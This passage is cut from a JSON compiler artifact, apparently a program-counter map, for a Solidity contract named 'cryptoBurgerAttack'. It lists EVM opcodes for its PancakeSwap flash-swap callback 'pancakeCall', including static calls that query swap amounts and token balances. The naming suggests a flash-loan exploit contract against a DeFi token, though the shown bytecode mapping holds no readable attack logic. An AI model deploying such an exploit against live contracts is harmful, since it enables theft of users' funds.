    "790": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2813,
        2820
      ],
      "op": "JUMP",
      "path": "0"
    },
    "791": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "794": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "MUL",
      "path": "0"
    },
    "795": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "797": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "ADD",
      "path": "0"
    },
    "798": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2820
      ],
      "op": "ADD",
      "path": "0"
    },
    "799": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "800": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "802": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "804": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "806": {
      "op": "SHL"
    },
    "807": {
      "op": "SUB"
    },
    "808": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "AND",
      "path": "0"
    },
    "809": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "810": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "DUP2",
      "path": "0"
    },
    "811": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "813": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "815": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "817": {
      "op": "SHL"
    },
    "818": {
      "op": "SUB"
    },
    "819": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "AND",
      "path": "0"
    },
    "820": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "DUP2",
      "path": "0"
    },
    "821": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "822": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "POP",
      "path": "0"
    },
    "823": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2813,
        2827
      ],
      "op": "POP",
      "path": "0"
    },
    "824": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "826": {
      "op": "DUP1"
    },
    "827": {
      "op": "MLOAD"
    },
    "828": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "830": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "833": {
      "op": "DUP4"
    },
    "834": {
      "op": "CODECOPY"
    },
    "835": {
      "op": "DUP2"
    },
    "836": {
      "op": "MLOAD"
    },
    "837": {
      "op": "SWAP2"
    },
    "838": {
      "op": "MSTORE"
    },
    "839": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2841
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 5
    },
    "840": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2842,
        2843
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "842": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "DUP2",
      "path": "0"
    },
    "843": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "844": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "DUP2",
      "path": "0"
    },
    "845": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "LT",
      "path": "0"
    },
    "846": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x359"
    },
    "849": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x359"
    },
    "853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2837,
        2844
      ],
      "op": "JUMP",
      "path": "0"
    },
    "857": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "858": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "860": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "862": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "864": {
      "op": "SHL"
    },
    "865": {
      "op": "SUB"
    },
    "866": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2853
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "867": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2853
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "868": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2853
      ],
      "op": "AND",
      "path": "0"
    },
    "869": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "871": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "872": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "DUP4",
      "path": "0"
    },
    "873": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "MUL",
      "path": "0"
    },
    "874": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "875": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "876": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "877": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "ADD",
      "path": "0"
    },
    "878": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "879": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "880": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2844
      ],
      "op": "ADD",
      "path": "0"
    },
    "881": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2837,
        2853
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 6,
      "value": "0x40"
    },
    "884": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "885": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "890": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "892": {
      "op": "SHL"
    },
    "893": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP2",
      "path": "0"
    },
    "894": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "895": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2864,
        2893
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "897": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2864,
        2893
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "898": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "900": {
      "op": "DUP1"
    },
    "901": {
      "op": "MLOAD"
    },
    "902": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "904": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "907": {
      "op": "DUP4"
    },
    "908": {
      "op": "CODECOPY"
    },
    "909": {
      "op": "DUP2"
    },
    "910": {
      "op": "MLOAD"
    },
    "911": {
      "op": "SWAP2"
    },
    "912": {
      "op": "MSTORE"
    },
    "913": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "914": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        2968
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "919": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        2968
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3A7"
    },
    "923": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2982,
        2997
      ],
      "op": "DUP7",
      "path": "0"
    },
    "925": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2982,
        2997
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "926": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3011,
        3015
      ],
      "op": "DUP7",
      "path": "0"
    },
    "927": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3011,
        3015
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "930": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ADD",
      "path": "0"
    },
    "931": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "934": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMP",
      "path": "0"
    },
    "935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "936": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "940": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "941": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP1",
      "path": "0"
    },
    "942": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP4",
      "path": "0"
    },
    "943": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SUB",
      "path": "0"
    },
    "944": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP2",
      "path": "0"
    },
    "945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP7",
      "path": "0"
    },
    "946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "GAS",
      "path": "0"
    },
    "947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "949": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP1",
      "path": "0"
    },
    "950": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3C4"
    },
    "954": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "955": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "956": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP1",
      "path": "0"
    },
    "959": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "960": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "961": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "963": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "REVERT",
      "path": "0"
    },
    "964": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "POP",
      "path": "0"
    },
    "966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "POP",
      "path": "0"
    },
    "967": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "POP",
      "path": "0"
    },
    "968": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "POP",
      "path": "0"
    },
    "969": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "972": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "973": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP3",
      "path": "0"
    },
    "976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "977": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "979": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "980": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "981": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP2",
      "path": "0"
    },
    "982": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ADD",
      "path": "0"
    },
    "983": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "985": {
      "op": "NOT"
    },
    "986": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "AND",
      "path": "0"
    },
    "987": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP3",
      "path": "0"
    },
    "988": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ADD",
      "path": "0"
    },
    "989": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "991": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "992": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3EC"
    },
    "995": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "996": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "997": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "DUP2",
      "path": "0"
    },
    "998": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "ADD",
      "path": "0"
    },
    "999": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1000": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "1003": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1004": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2918,
        3025
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1005": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 7,
      "value": "0x0"
    },
    "1007": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1008": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1010": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1011": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1016": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1018": {
      "op": "SHL"
    },
    "1019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1021": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3158,
        3162
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1024": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1025": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ADD",
      "path": "0"
    },
    "1026": {
      "op": "MSTORE"
    },
    "1027": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2903,
        3025
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1028": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        2903,
        3025
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1029": {
      "op": "POP"
    },
    "1030": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1032": {
      "op": "DUP1"
    },
    "1033": {
      "op": "MLOAD"
    },
    "1034": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1036": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "1039": {
      "op": "DUP4"
    },
    "1040": {
      "op": "CODECOPY"
    },
    "1041": {
      "op": "DUP2"
    },
    "1042": {
      "op": "MLOAD"
    },
    "1043": {
      "op": "SWAP2"
    },
    "1044": {
      "op": "MSTORE"
    },
    "1045": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3041,
        3174
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1046": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1048": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1050": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1052": {
      "op": "SHL"
    },
    "1053": {
      "op": "SUB"
    },
    "1054": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1055": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1056": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "AND",
      "path": "0"
    },
    "1057": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3139
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1058": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3149
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "1063": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3149
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1064": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1066": {
      "op": "ADD"
    },
    "1067": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1069": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1071": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1073": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1074": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "SUB",
      "path": "0"
    },
    "1075": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1076": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1077": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "GAS",
      "path": "0"
    },
    "1078": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "1079": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1080": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1081": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1082": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x447"
    },
    "1085": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1086": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1089": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1090": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1094": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1096": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "POP",
      "path": "0"
    },
    "1097": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "POP",
      "path": "0"
    },
    "1098": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "POP",
      "path": "0"
    },
    "1099": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "POP",
      "path": "0"
    },
    "1100": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1102": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1103": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1104": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1106": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "NOT",
      "path": "0"
    },
    "1107": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1109": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1110": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ADD",
      "path": "0"
    },
    "1111": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "AND",
      "path": "0"
    },
    "1112": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1113": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3125,
        3164
      ],
      "op": "ADD",
      "path": "0"
    },
    "1114": {
